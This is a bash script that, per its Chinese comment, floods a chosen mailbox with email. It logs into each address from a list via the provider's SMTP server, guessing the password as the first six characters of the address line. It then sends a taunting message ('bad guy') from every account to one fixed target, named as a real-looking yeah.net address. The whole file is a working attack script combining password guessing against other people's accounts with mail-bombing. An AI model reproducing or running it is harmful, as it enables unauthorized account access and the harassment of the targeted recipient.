#/bin/bash
# 向指定邮箱发送大量邮件.
# email.list:
# willemsen@yeah.net
# hoogergbrugge@126.com
# ...
# 

ACCEPT=willemsen@yeah.net   # 收件箱

for LINE in `cat email.list`
do
  if [[ $LINE = -* ]]; then
     printf "\033[34;49;1m %097d" 0|tr "0" "-"
     printf "\n\033[0m"
     continue
  fi
  USERNAME=$LINE
  #ACCEPT=$USERNAME
  PASSWORD=${LINE:0:6}
  SMTP=smtp.${USERNAME##*@}
  if [ "$SMTP" = "smtp.yeah.net" ]; then
     printf "\033[32;49;1m %-25s \033[0m" $USERNAME
  elif [ "$SMTP" = "smtp.126.com" ]; then
     printf "\033[36;49;1m %-25s \033[0m" $USERNAME
  else
     printf "\033[31;49;1m %-25s \033[0m"  $USERNAME
  fi
  sendemail -s $SMTP -f $USERNAME -t $ACCEPT -u ${USERNAME%@*} \
            -m "坏蛋!!!! ${USERNAME:0:4}"                 \
            -xu ${USERNAME%@*} -xp $PASSWORD -o tls=auto;
  
done

